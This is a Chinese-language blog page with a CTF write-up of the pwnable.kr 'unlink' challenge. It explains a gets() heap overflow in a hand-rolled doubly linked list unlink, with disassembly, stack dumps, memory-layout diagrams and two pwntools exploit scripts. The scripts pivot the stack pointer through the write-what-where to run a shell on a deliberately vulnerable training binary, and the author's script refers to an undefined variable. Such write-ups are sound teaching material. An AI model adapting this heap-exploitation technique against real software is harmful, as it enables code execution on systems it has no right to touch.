<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>unlink Writeup[pwnable.kr] | WeaponX&#39;s Blog</title>
  <meta name="author" content="WeaponX">
  
  <meta name="description" content="Vulnerability|Security|Binary">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="unlink Writeup[pwnable.kr]"/>
  <meta property="og:site_name" content="WeaponX&#39;s Blog"/>

  
    <meta property="og:image" content="undefined"/>
  

  <link href="/favicon.png" rel="icon">
  <link rel="alternate" href="/atom.xml" title="WeaponX&#39;s Blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  

  <script>
    var _hmt = _hmt || [];
    (function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?ab50f379bb6434641ee0125ce5d37f23";
    var s = document.getElementsByTagName("script")[0]; 
    s.parentNode.insertBefore(hm, s);
    })();
  </script>
  <script>
  (function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
   })();
   </script>
</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">WeaponX&#39;s Blog</a></h1>
  <h2><a href="/">Binary</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">Home</a></li>
    
      <li><a href="/archives">Archives</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div>
</header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2017-02-21T06:43:18.000Z"><a href="/2017/02/21/unlink-Writeup-pwnable-kr/">2017-02-21</a></time>
      
      
  
    <h1 class="title">unlink Writeup[pwnable.kr]</h1>
  

    </header>
    <div class="entry">
      
        <h2 id="0x00-unlink"><a href="#0x00-unlink" class="headerlink" title="0x00 unlink"></a>0x00 unlink</h2><p>unlink是堆溢出的常用思路，free一个堆时。有可能会调用unlink函数来拆卸freelist上堆块完成堆块的合并。如果能控制堆的控制区就有可能造成DWSHOOT（有限的任意地址写入）。</p>
<a id="more"></a>
<h2 id="0x01-题目源码"><a href="#0x01-题目源码" class="headerlink" title="0x01 题目源码"></a>0x01 题目源码</h2><p>程序的源代码如下，根据题目就可以猜到是堆溢出的unlink漏洞。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> tagOBJ&#123;</div><div class="line">    <span class="keyword">struct</span> tagOBJ* fd;</div><div class="line">    <span class="keyword">struct</span> tagOBJ* bk;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</div><div class="line">&#125;OBJ;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</div><div class="line">    system(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</div><div class="line">    OBJ* BK;</div><div class="line">    OBJ* FD;</div><div class="line">    BK=P-&gt;bk;</div><div class="line">    FD=P-&gt;fd;</div><div class="line">    FD-&gt;bk=BK;</div><div class="line">    BK-&gt;fd=FD;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">    <span class="built_in">malloc</span>(<span class="number">1024</span>);</div><div class="line">    OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</div><div class="line">    OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</div><div class="line">    OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</div><div class="line"></div><div class="line">    <span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></div><div class="line">    A-&gt;fd = B;</div><div class="line">    B-&gt;bk = A;</div><div class="line">    B-&gt;fd = C;</div><div class="line">    C-&gt;bk = B;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"here is stack address leak: %p\n"</span>, &amp;A);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"here is heap address leak: %p\n"</span>, A);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"now that you have leaks, get shell!\n"</span>);</div><div class="line">    <span class="comment">// heap overflow!</span></div><div class="line">    gets(A-&gt;buf);</div><div class="line"></div><div class="line">    <span class="comment">// exploit this unlink!</span></div><div class="line">    unlink(B);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><p>因为<code>gets(A-&gt;buf)</code>有一个缓冲区溢出，可以控制堆A、B和C的内容。unlink模拟堆溢出free后造成的任意地址写DWSHOOT，</p>
<p>1.通过写GOT表完成GOT Hijack<br>2.写程序的返回地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">unlink@ubuntu:~$ checksec unlink</div><div class="line">[*] <span class="string">'/home/unlink/unlink'</span></div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div></pre></td></tr></table></figure>
<p>没有开启RELRO，所以应该有两种方法来完成利用。</p>
<p>第一种方法，通过GOT劫持来完成利用。结果在unlink后没有调用任何函数，所以这个思路行不通。</p>
<p>第二种方法，写程序的返回地址。再看<code>unlink</code>函数的操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</div><div class="line">    OBJ* BK;</div><div class="line">    OBJ* FD;</div><div class="line">    BK=P-&gt;bk;</div><div class="line">    FD=P-&gt;fd;</div><div class="line">    FD-&gt;bk=BK;</div><div class="line">    BK-&gt;fd=FD;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>通过调试程序，发现三个堆在内存中的分布如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">                   +---------------+</div><div class="line">                   |               |</div><div class="line">[heap addr] -----&gt; +-------+-------+</div><div class="line">             +-----|  FD   |  BK   |</div><div class="line">[A-&gt;buff]----|---&gt; +-------+-------+&lt;-------+</div><div class="line">             |     |               |  A     |</div><div class="line">             |     +---------------+        |</div><div class="line">             |     |               |        |</div><div class="line">             |     +-------+-------+        |</div><div class="line">       +-----|-----|  FD   |  BK   |--------+</div><div class="line">       |     +---&gt; +-------+-------+ &lt;------+</div><div class="line">       |           |               |  B     |</div><div class="line">       |           +---------------+        |</div><div class="line">       |           |               |        |</div><div class="line">       |           +-------+-------+        |</div><div class="line">       |           |  FD   |  BK   |--------+</div><div class="line">       +--------&gt;  +-------+-------+  </div><div class="line">                   |               |  C</div><div class="line">                   +---------------+</div></pre></td></tr></table></figure>
<p>其实<code>unlink(B)</code>操作完成了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">B-&gt;fd-&gt;bk = B-&gt;bk</div><div class="line">B-&gt;bk-&gt;fd = B-&gt;fd</div></pre></td></tr></table></figure>
<p>如果要利用unlink来覆盖返回地址，则B的布局应该是这样的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">+-------------------+-------------------+</div><div class="line">|stack[<span class="built_in">return</span> addr] |     addr shell    |</div><div class="line">+-------------------+-------------------+</div><div class="line">|               padding                 |</div><div class="line">+---------------------------------------+</div></pre></td></tr></table></figure>
<p>这样在执行<code>B-&gt;fd-&gt;bk = B-&gt;bk</code>就完成了覆盖main的返回地址。But，执行<code>B-&gt;bk-&gt;fd = B-&gt;fd</code>这一段的时候，<code>[addr shell]</code>则会落入不可读写的地址，造成程序段错误。所以，这个思路又进了死胡同。</p>
<p>然后看到了main函数结尾的语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">80485f2:   e8 0d ff ff ff          call   8048504 &lt;unlink&gt;</div><div class="line">80485f7:   83 c4 10                add    $0x10,%esp</div><div class="line">80485fa:   b8 00 00 00 00          mov    $0x0,%eax</div><div class="line">80485ff:   8b 4d fc                mov    -0x4(%ebp),%ecx</div><div class="line">8048602:   c9                      leave  </div><div class="line">8048603:   8d 61 fc                lea    -0x4(%ecx),%esp</div><div class="line">8048606:   c3                      ret</div></pre></td></tr></table></figure>
<p>简单的翻译一下就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">mov ecx, [ebp - 0x4]</div><div class="line">mov esp, ebp</div><div class="line">pop ebp</div><div class="line">lea esp, [ecx - 0x4]</div><div class="line">ret</div></pre></td></tr></table></figure>
<p>看看此时栈上的数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">0000| 0xffd692c0 --&gt; 0x1 </div><div class="line">0004| 0xffd692c4 --&gt; 0x875c410 --&gt; 0x875c440 --&gt; 0x0 [A] </div><div class="line">0008| 0xffd692c8 --&gt; 0x875c440 --&gt; 0x0               [C]</div><div class="line">0012| 0xffd692cc --&gt; 0x875c428 --&gt; 0x875c440 --&gt; 0x0 [B]</div><div class="line">0016| 0xffd692d0 --&gt; 0xf76c93dc --&gt; 0xf76ca1e0 --&gt; 0x0 </div><div class="line">0020| 0xffd692d4 --&gt; 0xffd692f0 --&gt; 0x1 </div><div class="line">0024| 0xffd692d8 --&gt; 0x0  [EBP]</div><div class="line">0028| 0xffd692dc --&gt; 0xf7532637 (&lt;__libc_start_main+247&gt;:   add    esp,0x10)</div></pre></td></tr></table></figure>
<p>所以，只要能控制栈上的数据，就可以控制ESP，从而控制EIP。但是问题来了，这个题目只是堆溢出，无法直接控制栈上的数据。所以只能利用unlink的DWSHOOT来完成栈上数据的修改。</p>
<p>所以，我们只需要这样布局内存空间即可完成覆盖ESP：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">+-------------------+-------------------+  &lt;- heap addr[A]</div><div class="line">|        FD         |        BK         |</div><div class="line">+-------------------+-------------------+  &lt;- [A-&gt;buf]</div><div class="line">|     shell addr    |      AAAA         |</div><div class="line">+---------------------------------------+</div><div class="line">|              AAAAAAAA                 |</div><div class="line">+---------------------------------------+  &lt;- [B]</div><div class="line">|     heap + 12     |     stack + 16    |</div><div class="line">+-------------------+-------------------+</div></pre></td></tr></table></figure>
<p>所以最终的exploit如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">io = process(<span class="string">'./unlink'</span>)</div><div class="line">shell_addr = <span class="number">0x80484eb</span></div><div class="line"></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'here is stack address leak: '</span>)</div><div class="line">stack_addr = p.recv(<span class="number">10</span>)</div><div class="line">p.recvuntil(<span class="string">'here is heap address leak: '</span>)</div><div class="line">heap_addr = p.recv(<span class="number">9</span>)</div><div class="line"></div><div class="line"></div><div class="line">stack_addr = int(stack_addr, <span class="number">16</span>)</div><div class="line">heap_addr = int(heap_addr, <span class="number">16</span>)</div><div class="line">target_addr = stack_addr + <span class="number">0x10</span> </div><div class="line"></div><div class="line">payload  = p32(shell_addr)</div><div class="line">payload += <span class="string">'A'</span> * <span class="number">12</span></div><div class="line">payload += p32(heap_addr + <span class="number">12</span>)</div><div class="line">payload += p32(target_addr)</div><div class="line">io.sendline(payload)</div><div class="line"></div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">cat flag</div><div class="line">conditional_write_what_where_from_unl1nk_explo1t</div></pre></td></tr></table></figure>
<p>顺便看了下题目给出的标准答案：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.arch = <span class="string">'i386'</span>   <span class="comment"># i386 / arm</span></div><div class="line">r = process([<span class="string">'/home/unlink/unlink'</span>])</div><div class="line">leak = r.recvuntil(<span class="string">'shell!\n'</span>)</div><div class="line">stack = int(leak.split(<span class="string">'leak: 0x'</span>)[<span class="number">1</span>][:<span class="number">8</span>], <span class="number">16</span>)</div><div class="line">heap = int(leak.split(<span class="string">'leak: 0x'</span>)[<span class="number">2</span>][:<span class="number">8</span>], <span class="number">16</span>)</div><div class="line">shell = <span class="number">0x80484eb</span></div><div class="line">payload = pack(shell)       <span class="comment"># heap + 8  (new ret addr)</span></div><div class="line">payload += pack(heap + <span class="number">12</span>)  <span class="comment"># heap + 12 (this -4 becomes ESP at ret)</span></div><div class="line">payload += <span class="string">'3333'</span>       <span class="comment"># heap + 16</span></div><div class="line">payload += <span class="string">'4444'</span></div><div class="line">payload += pack(stack - <span class="number">0x20</span>)   <span class="comment"># eax. (address of old ebp of unlink) -4</span></div><div class="line">payload += pack(heap + <span class="number">16</span>)  <span class="comment"># edx.</span></div><div class="line">r.sendline( payload )</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>

      
    </div>
    <footer>
      
        
          <p style="border-top: #e0e0e0 1px dashed; border-right: #e0e0e0 1px dashed; border-bottom: #e0e0e0 1px dashed; border-left: #e0e0e0 1px dashed; padding-top: 10px;padding-right: 10px;padding-bottom: 10px;padding-left: 110px; background: url(http://i.creativecommons.org/l/by-nc-sa/2.5/cn/88x31.png) #e5f1f4 no-repeat 1% 50%; font-family: 微软雅黑; font-size:11px;" id="PSignature">  
作者：<a href="http://weaponx.site">WeaponX</a>
<br>出处：<a href="http://weaponx.site/2017/02/21/unlink-Writeup-pwnable-kr/">http://weaponx.site/2017/02/21/unlink-Writeup-pwnable-kr/</a>           
<br>本文采用<a href="http://creativecommons.org/licenses/by-nc-sa/2.5/cn/" rel="license">知识共享署名-非商业性使用-相同方式共享 2.5 中国大陆许可协议</a>进行许可，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接。
</p>

        
        
  
  <div class="categories">
    <a href="/categories/tech/">技术</a>
  </div>

        
  
  <div class="tags">
    <a href="/tags/安全/">安全</a>, <a href="/tags/pwn/">pwn</a>
  </div>

        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>


<section id="comment">
  
  
  
    <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
    <script src="https://img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"></script>
    <script>
    var cloudTieConfig = {
        url: document.location.href, 
        sourceId: "",
        productKey: "0d4cadd44ae547119479fb84d9f5260e",
        target: "cloud-tie-wrapper"
    };
    var yunManualLoad = true;
    Tie.loader("aHR0cHM6Ly9hcGkuZ2VudGllLjE2My5jb20vcGMvbGl2ZXNjcmlwdC5odG1s", true);
    </script>
  
</section>


</div></div>
    <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="搜索">
    <input type="hidden" name="q" value="site:weaponx.site">
  </form>
</div>

  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/安全/">安全</a><small>8</small></li>
  
    <li><a href="/categories/tech/">技术</a><small>22</small></li>
  
    <li><a href="/categories/life/">生活</a><small>3</small></li>
  
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">标签</h3>
  <ul class="entry">
  
    <li><a href="/tags/ASLR/">ASLR</a><small>1</small></li>
  
    <li><a href="/tags/Django/">Django</a><small>1</small></li>
  
    <li><a href="/tags/Hexo/">Hexo</a><small>4</small></li>
  
    <li><a href="/tags/Linux/">Linux</a><small>1</small></li>
  
    <li><a href="/tags/UAF/">UAF</a><small>2</small></li>
  
    <li><a href="/tags/pwn/">pwn</a><small>13</small></li>
  
    <li><a href="/tags/python/">python</a><small>2</small></li>
  
    <li><a href="/tags/wargame/">wargame</a><small>3</small></li>
  
    <li><a href="/tags/博客/">博客</a><small>4</small></li>
  
    <li><a href="/tags/安全/">安全</a><small>18</small></li>
  
    <li><a href="/tags/影评/">影评</a><small>1</small></li>
  
    <li><a href="/tags/整形溢出/">整形溢出</a><small>1</small></li>
  
    <li><a href="/tags/漏洞/">漏洞</a><small>1</small></li>
  
    <li><a href="/tags/漏洞分析/">漏洞分析</a><small>3</small></li>
  
    <li><a href="/tags/调试/">调试</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">友情链接</h3>
  <ul class="entry">
  
    <li><a href="http://www.cnblogs.com/goabout2/" title="goabout2">goabout2</a></li>
  
    <li><a href="http://rootkiter.com/" title="RootKiter">RootKiter</a></li>
  
    <li><a href="http://reverse-tcp.xyz/" title="Urahara">Urahara</a></li>
  
    <li><a href="https://www.leavesongs.com/" title="phith0n牛的离别歌">phith0n</a></li>
  
  </ul>
</div>



  <div class="widget tag">
  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=270 height=86 src="//music.163.com/outchain/player?type=2&id=427542287&auto=0&height=66"></iframe>
</div>

</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  
  &copy; 2017 WeaponX
  
</div>
<div class="clearfix"></div></footer>
  <script src="http://apps.bdimg.com/libs/jquery/2.0.3/jquery.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>




<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


</body>
</html>
